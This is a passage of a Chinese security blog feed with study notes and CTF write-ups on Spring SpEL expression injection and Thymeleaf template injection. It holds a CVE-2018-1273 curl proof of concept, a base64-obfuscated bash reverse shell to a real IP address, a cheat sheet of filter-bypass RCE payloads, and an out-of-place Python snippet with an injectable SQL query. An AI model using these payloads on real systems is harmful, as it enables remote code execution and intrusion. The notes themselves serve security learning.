+<img src="https://skyblu3519.github.io/post-images/spel_re/1714834031770-cde5607a-be13-4ed7-873c-d460ad53d9a8.png" alt="image.png" loading="lazy"></p>
+<p>所以最简单的方式就是传入一个包含变量表达式的模版，然后用变量表达式执行任意的SpEL表达式。比如：</p>
+<pre><code>&lt;td th:text=&quot;${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}&quot;&gt;&lt;/td&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/spel_re/1714834318634-c857d19f-7639-467d-90bc-ab0261151565.png" alt="image.png" loading="lazy"></figure>
+<p>另外，之前看到的<code>[[...]]</code>这种写法其实是一种内联表达式的写法，参照<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#inlining">官方文档</a>给的例子，应该就是让其在任何文本标签中执行Thymeleaf的Standard Expression。</p>
+<p>所以这个payload也可以写成</p>
+<pre><code>[[${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}]]
+</code></pre>
+<p>另外在题目的thymeleaf3.0.15版本中，在对返回的模版名称<code>viewTemplateName</code>新增了检查<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714835193225-cec8fb6a-f33a-49fa-8772-8f1637353cc3.png" alt="image.png" loading="lazy"></p>
+<p>这个 <code>checkViewNameNotInRequest</code> 函数是为了确保在处理视图名字时，避免视图名称中包含的表达式被恶意利用，所以直接传入<code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x</code>是无法被利用的。</p>
+<p>另外，在预处理的部分也新增对恶意利用的检查，这部分的绕过具体参考<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SpEL表达式注入初见]]></title>
+        <id>https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/</id>
+        <link href="https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/">
+        </link>
+        <updated>2024-04-21T19:09:55.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="背景知识">背景知识</h1>
+<p>SpEL注入漏洞是一种安全漏洞，主要发生在使用Spring框架的应用中。Spring Expression Language（SpEL）是一个强大的表达式语言，用于在运行时查询和操作对象图。虽然SpEL提供了很多便利，但如果不正确地处理用户输入，就可能导致注入攻击。</p>
+<p>测试代码：</p>
+<pre><code class="language-java">import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class MainApp {
+    public static void main(String[] args) {
+        String exp = &quot;new java.lang.ProcessBuilder(new String[]{\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;}).start()&quot;;
+
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(exp);
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        System.out.println(expression.getValue(context));
+
+    }
+}
+</code></pre>
+<h1 id="spel漏洞复现">SpEL漏洞复现</h1>
+<h2 id="低版本springboot中illegalstateexception">低版本SpringBoot中IllegalStateException</h2>
+<p>影响的版本有</p>
+<ul>
+<li>1.1.0-1.1.12</li>
+<li>1.2.0-1.2.7</li>
+<li>1.3.0</li>
+</ul>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;parent&gt;
+  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+  &lt;version&gt;1.2.0.RELEASE&lt;/version&gt;
+&lt;/parent&gt;
+</code></pre>
+<p>测试代码</p>
+<pre><code class="language-java">package com.example.mywebapp;
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+@Controller
+public class exploit {
+    @RequestMapping(&quot;/&quot;)
+    public String index(String payload){
+        throw new IllegalStateException(payload);
+    }
+}
+
+</code></pre>
+<p>访问是一个错误页面，当输入的是一个SpEL表达式的是后可以看到被解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713623131522-2c5170bc-9fec-4090-9c7e-976424ef22b5.png" alt="image.png" loading="lazy"></p>
+<p>漏洞分析从<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>开始，找到最后处理的<code>processDispatchResult</code>函数。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633352226-0ec621b1-2335-4f45-ac34-77b9f333c72d.png" alt="image.png" loading="lazy"></p>
+<p>之前学Thymeleaf的时候对Spring Boot处理请求的流程已经有个大概的了解了，这里<code>IllegalStateException</code>最后会用一个<strong>error View</strong>对象来渲染返回的页面。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633572769-7866d6f6-49a9-4b5c-b5aa-baaeac4d8c18.png" alt="image.png" loading="lazy"></p>
+<p>它的<code>render</code>方法会将渲染所需的数据对象（<strong>model</strong>）设置为渲染上下文的根对象，然后使用一个助手类 <strong>helper</strong> 来处理渲染的模版，也就是上图中<strong>template</strong>的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633832819-0d02fb9b-943c-4906-b3de-62b7453ffed8.png" alt="image.png" loading="lazy"></p>
+<p><code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code>是最后用来渲染<strong>template</strong>的函数。</p>
+<ul>
+<li>处理的字符串<code>strVal</code>存在<code>${</code>则对其进行解析</li>
+<li>对待解析的<code>placeholder</code>递归调用一次<code>parseStringValue</code>（有点模版注入的味道了）</li>
+<li>返回的<code>placeholder</code>会交给<code>placeholderResolver.resolvePlaceholder</code>从<strong>model</strong>中取值得到<code>propVal</code></li>
+<li>对<code>propVal</code>再递归调用<code>parseStringValue</code>处理</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/SpEL/1713634117230-474bfa4b-abec-4c66-a77a-0f4def3b2913.png" alt="image.png" loading="lazy"></figure>
+<p>而<code>placeholderResolver.resolvePlaceholder</code>处理方式就是一个SpEL表达式的解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634489337-1c3d9733-d890-4933-9d30-d54a32484ba2.png" alt="image.png" loading="lazy"></p>
+<p>（Ps.这里解析的表达式直接是一个无任何包裹的字符串，按照SpEL的规则它应该被理解为一个<strong>BeanID</strong>，不过这里却直接被解析为<strong>rootObject</strong>中<strong>HashMap</strong>里面的一个<strong>value</strong>，有一点疑惑<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634741196-00786bb7-0986-4548-a0b5-b73145066d54.png" alt="image.png" loading="lazy"></p>
+<p>根据它的流程我测试代码如下</p>
+<pre><code class="language-java">public static void main(String[] args) {
+    ModelMap modelMap = new ModelMap();
+    modelMap.addAttribute(&quot;sky&quot;, &quot;blue&quot;);
+    ExpressionParser parser = new SpelExpressionParser();
+    Expression expression = parser.parseExpression(&quot;sky&quot;);
+
+    StandardEvaluationContext context = new StandardEvaluationContext();
+    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(modelMap);
+    context.setRootObject(map);
+
+    System.out.println(expression.getValue(context));
+}
+</code></pre>
+<p>没有任何悬念的报错了</p>
+<p>以我现在的能力好像还没发探究其中的原因，故在此记录<br>
+）</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>经过分析，当攻击者可以控制<code>propVal</code>的内容将其变为一个恶意的SpEL表达式时，就可以在代码对<code>propVal</code>解析的时候触发。样例中<code>IllegalStateException(payload)</code>将会设置<strong>message</strong>字段为<strong>payload</strong><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713635254196-93693f3b-16d7-4d50-8ed9-467894e790e1.png" alt="image.png" loading="lazy"></p>
+<p>另外还需注意的是<code>placeholderResolver.resolvePlaceholder</code>返回时会对字符串进行html实体编码来防止XSS</p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<p>在1.3.1版本中为<strong>PlaceholderResolver</strong>新增了一个子类<strong>NonRecursivePlaceholderResolver</strong>，之前<code>PropertyPlaceholderHelper#parseStringValue</code>中<code>placeholderResolver.resolvePlaceholder</code>的调用在新版本中都变成了<strong>NonRecursivePlaceholderResolver</strong>的<code>resolvePlaceholder</code>方法。</p>
+<p>而<strong>PropertyPlaceholderHelper</strong>也新增了一个子类<strong>NonRecursivePropertyPlaceholderHelper</strong>，原来<code>PropertyPlaceholderHelper#parseStringValue</code>的调用全部变成了<code>NonRecursivePropertyPlaceholderHelper#parseStringValue</code>。</p>
+<p>在最初调用的时候会将<strong>placeholderResolver</strong>转为<strong>NonRecursivePlaceholderResolver</strong>对象<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637054082-c364bbc2-3c3f-4f44-9f35-c6c57345ff27.png" alt="image.png" loading="lazy"></p>
+<p><code>NonRecursivePlaceholderResolver#resolvePlaceholder</code>在解析的时候会先判断自身的resolver，如果是<strong>NonRecursivePlaceholderResolver</strong>则不会进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637299505-b73c410a-d55f-4440-aee2-00a7e70f9464.png" alt="image.png" loading="lazy"></p>
+<p>我们知道在初次调用<code>parseStringValue</code>的时候传入的<strong>NonRecursivePlaceholderResolver</strong>对象的<strong>resolver</strong>属性是一个<strong>PlaceholderResolver</strong>。也就说在<code>parseStringValue</code>的第一层调用时，SpEL表达式的解析还是正常的，而再像之前版本递归调用解析时，传入的<strong>placeholderResolver</strong>就是一个<strong>NonRecursivePlaceholderResolver</strong>对象，也就不能在这一层进行任何的SpEL表达式的解析了。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637613847-ee6099f0-10ca-4a1c-945e-e16ae4c79271.png" alt="image.png" loading="lazy"></p>
+<h2 id="cve-2018-1273-rce-with-spring-data-commons">CVE-2018-1273: RCE with Spring Data Commons</h2>
+<p>不是很懂Spring Data Commons的使用，故仅记录poc。</p>
+<p>漏洞环境：<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a></p>
+<p>poc</p>
+<pre><code>curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123&quot;
+
+curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')]=test&quot;
+</code></pre>
+<pre><code class="language-python">mu = re.match(r'.*\W', username)
+if mu is None: 
+    # 過濾password中所有英文字母跟等號
+    cflag = False
+    for w in password: 
+        if (w in string.ascii_letters) or (w == &quot;=&quot;): cflag = True
+    if (cflag): 
+        return None
+    else:
+        conn = sqlite3.connect(&quot;user.db&quot;)
+        rows = conn.execute(f&quot;select * from user where (user='{username}') and (pass='{password}');&quot;)
+</code></pre>
+<h1 id="相关题目">相关题目</h1>
+<h2 id="javacon">javacon</h2>
+<p>题目文件：<a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p>
+<p>默认路由会使用解密算法解出Cookie中的username，然后使用<code>getAdvanceValue</code>方法解析username。由于加解密算法知道，所以可以控制username的内容导致SpEL注入。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713684945667-37a33c73-9751-48bf-9ca3-0504bd35e853.png" alt="image.png" loading="lazy"></p>
+<p>需要注意的是<code>parseExpression</code>的第二个参数<code>parserContext</code>，它用来提供特定于解析过程的配置。具体而言，这个参数允许你自定义如何处理和解析表达式，包括定义表达式的前缀和后缀，以及是否应该使用模板模式。这里就自定了解析前缀<code>expressionPrefix</code>和解析后缀<code>expressionSuffix</code><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685122146-f4e519bd-d0bd-46aa-acd0-ea8a541f3ca2.png" alt="image.png" loading="lazy"></p>
+<p>可以使用下面的代码进行测试</p>
+<pre><code class="language-java">package com.exploit;
+
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+public class Encryptor {
+    static Logger logger = LoggerFactory.getLogger(Encryptor.class);
+
+    public Encryptor() {
+    }
+
+    public static String encrypt(String key, String initVector, String value) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(1, skeySpec, iv);
+            byte[] encrypted = cipher.doFinal(value.getBytes());
+            return Base64.getUrlEncoder().encodeToString(encrypted);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static String decrypt(String key, String initVector, String encrypted) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(2, skeySpec, iv);
+            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
+            return new String(original);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static void main(String[] args) {
+        System.out.println(encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{2*2}&quot;));
+    }
+}
+</code></pre>
+<p>在model中看到解析后的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685262376-216c2c1d-fa37-4493-909c-069adfc7a763.png" alt="image.png" loading="lazy"></p>
+<p>payload，思路是用反射的方式获取方法调用</p>
+<pre><code>#{''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'open -a Calculator')}
+</code></pre>
+<h2 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h2>
+<p>AdminController存在模版注入，注入点是hostname<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713725578292-6ca35ca6-34cd-47ff-99be-cc4827676cc6.png" alt="image.png" loading="lazy"></p>
+<p>这道题目才让我感觉SpEL注入和之前学的Thymeleaf模板注入还不够细致，也没我想象的那么简单，故只整理这部分的payload（未经过url编码）</p>
+<pre><code># 阳子的
+[[T(com.sun.org.apache.xalan.internal.utils.ObjectFactory).newInstance(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,new java.lang.Boolean(true)).parseRaw('T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMzEuMzIvMjIzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)').getValue()]]
+
+# 参考：https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE
+[[${__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)}),&quot;exec&quot;,&quot;open -a Calculator&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))}__::x}]]
+
+# Thymeleaf模板注入中不带&quot;_&quot;的写法，参考：https://xz.aliyun.com/t/9826
+[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;).getInputStream()).next()}
+]]
+</code></pre>
+<p>之后有空了好好分析一下这道题目。</p>
+<h1 id="杂项">杂项</h1>
+<h2 id="整理偷的payload">整理（偷）的payload</h2>
+<pre><code>// PoC原型
+
+// Runtime
+T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+T(Runtime).getRuntime().exec(&quot;calc&quot;)
+
+// ProcessBuilder
+new java.lang.ProcessBuilder({'calc'}).start()
+new ProcessBuilder({'calc'}).start()
+
+******************************************************************************
+// Bypass技巧
+
+// 反射调用
+T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
+T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
+// byte数组内容的生成后面有脚本
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
+// byte数组内容的生成后面有脚本
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+
+// JavaScript引擎通用PoC
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)
+
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)
+
+// JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})),)
+
+// JavaScript引擎+URL编码
+// 其中URL编码内容为：
+// 不加最后的getInputStream()也行，因为弹计算器不需要回显
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)
+
+// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功
+''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
+
+// JDK9新增的shell，还未测试
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+
+// 转自：https://www.jianshu.com/p/ce4ac733a4b9
+
+${pageContext} 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
+
+${pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)}   获取web路径
+
+${header}  文件头参数
+
+${applicationScope} 获取webRoot
+
+${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())}  执行命令
+
+
+// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。
+
+&lt;p th:text=&quot;${#this.getClass().forName('java.lang.System').getProperty('user.dir')}&quot;&gt;&lt;/p&gt;   //获取web路径
+</code></pre>
+<h2 id="参考链接">参考链接</h2>
+<p>这些链接才是精华！！！<br>
+很好的背景知识：<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br>
+<a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a><br>
+<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a><br>
+<a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a><br>
+很多payload：<a href="https://xz.aliyun.com/t/9245">https://xz.aliyun.com/t/9245</a><br>
+一道很有意思的题目：<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a><br>
+Thymeleaf模板注入补充：<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a><br>
+关于：<br>
+<a href="https://www.yulate.com/index.php/archives/48/">https://www.yulate.com/index.php/archives/48/</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thymeleaf模板注入]]></title>
+        <id>https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/</id>
+        <link href="https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/">
+        </link>
+        <updated>2024-04-12T16:53:08.000Z</updated>
+        <content type="html"><![CDATA[<p>实验环境参考：<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="片段表达式">片段表达式</h2>
+<p>片段表达式语法：</p>
+<ul>
+<li><code>~{templatename::selector}</code>，会在/WEB-INF/templates/目录下寻找名为templatename的模版中定义的fragment。</li>
+<li><code>~{templatename}</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
+<li><code>~{::selector} </code>或 <code>~{this::selector}</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li>
+</ul>
+<p>其中<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。<br>
+当<code>~{}</code>片段表达式中出现<code>::</code>，则<code>::</code>后需要有值，也就是<code>selector</code>。</p>
+<h2 id="预处理表达式">预处理表达式</h2>
+<pre><code>__${expression}__
+</code></pre>
+<blockquote>
+<p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有预处理表达式的功能。<br>
+预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式。<br>
+预处理的表达式与普通表达式完全一样，但被双下划线符号（如__${expression}__）包围。</p>
+</blockquote>
+<h1 id="流程浅析">流程浅析</h1>
+<p>先简单看下渲染一个模板的流程。</p>
+<p>对于下面的 <code>controller</code>（注意：在使用<code>@Controller</code>定义时，返回的<code>index</code>不会被当作字符串，而是会作为一个模板名称）：</p>
+<pre><code class="language-java">@GetMapping(&quot;/&quot;)
+public String index(Model model) {
+    model.addAttribute(&quot;name&quot;, &quot;World&quot;);
+    return &quot;index&quot;;
+}
+</code></pre>
+<p>首先是处理请求<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>的逻辑<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932311102-6eef5ab3-cf2b-4bc3-a3f1-fd9be12f67dd.png" alt="image.png" loading="lazy"></p>
+<p>前两步是根据请求的URL、HTTP方法等信息查找相应的<strong>Handler</strong>和<strong>Handler Adapter</strong>，具体的处理逻辑也就是执行我们写的<code>controller</code>代码是在</p>
+<pre><code class="language-java">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
+</code></pre>
+<p>这里返回的<strong>ModelAndView</strong>对象包含了模型数据和视图名称<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932938073-5769e749-dabf-471c-94d7-171fc60e63ae.png" alt="image.png" loading="lazy"></p>
+<p><code>processDispatchResult</code>会根据<strong>ModelAndView</strong>对象处理视图渲染<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933145805-53ed2640-5b9a-4394-b27d-947a060b6590.png" alt="image.png" loading="lazy"></p>
+<p><code>render</code>中<strong>DispatcherServlet</strong>会调用自己的<code>resolveViewName</code>方法根据视图名称和请求信息选出最适合的<strong>view</strong>对象，然后<strong>view</strong>对象调用它的<code>render</code>方法渲染模版处理请求。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933234854-0fca5626-e9ed-41ac-9b79-366fce0239de.png" alt="image.png" loading="lazy"></p>
+<p><code>DispatcherServlet#resolveViewName</code>会从遍历<code>viewResolvers</code>中存储的<strong>ViewResolver</strong>对象，调用它们的<code>resolveViewName</code>方法来寻找。<code>viewResolvers</code>实在SpringBoot初始化的时候加载的<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933612796-d978b9eb-e611-43fb-aa2f-4250ae7e0edf.png" alt="image.png" loading="lazy"></p>
+<p>这里第一个调用的是<strong>ContentNegotiatingViewResolver</strong>，它不是直接解析视图名称，而是根据请求的内容类型或请求参数决定使用哪个其他视图解析器。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933664702-4d3b8765-8bf6-4ec0-9d55-8178b2d41d54.png" alt="image.png" loading="lazy"></p>
+<p><code>ContentNegotiatingViewResolver#resolveViewName</code>选出<strong>View</strong>对象可以分为两步：</p>
+<ul>
+<li>获取候选视图：<code>getCandidateViews(viewName, locale, requestedMediaTypes)</code>方法会基于<strong>视图名称</strong>、<strong>地区设置</strong>和<strong>请求的媒体类型</strong>（Accept请求头）获取一系列候选视图。</li>
+<li>选择最佳视图：<code>getBestView(candidateViews, requestedMediaTypes, attrs)</code>方法从候选视图中选择最佳视图。这个选择是基于所<strong>请求的媒体类型</strong>，以及视图是否能够处理这些媒体类型。</li>
+</ul>
+<p>在<code>getCandidateViews</code>方法中可以发现，它依然是遍历自己的<code>viewResolvers</code>中的<strong>ViewResolver</strong>对象，然后调用它们的<code>resolveViewName</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934282783-62b8bcda-b7da-44fe-9252-df538f4bcd7e.png" alt="image.png" loading="lazy"></p>
+<p>这里就可以看到<strong>ThymeleafViewResolver</strong>的<code>resolveViewName</code>方法被调用<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934386588-a6c54af4-08a9-4d38-9dae-970f4308d8f1.png" alt="image.png" loading="lazy"></p>
+<p>跟进这个方法，最后我们可以看到<strong>View</strong>对象是通过<code>ThymeleafViewResolver#loadView</code>生成的，这里还没有涉及到模板文件的读取。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934480852-1885a63f-ebe1-4270-80b0-dd011908c454.png" alt="image.png" loading="lazy"></p>
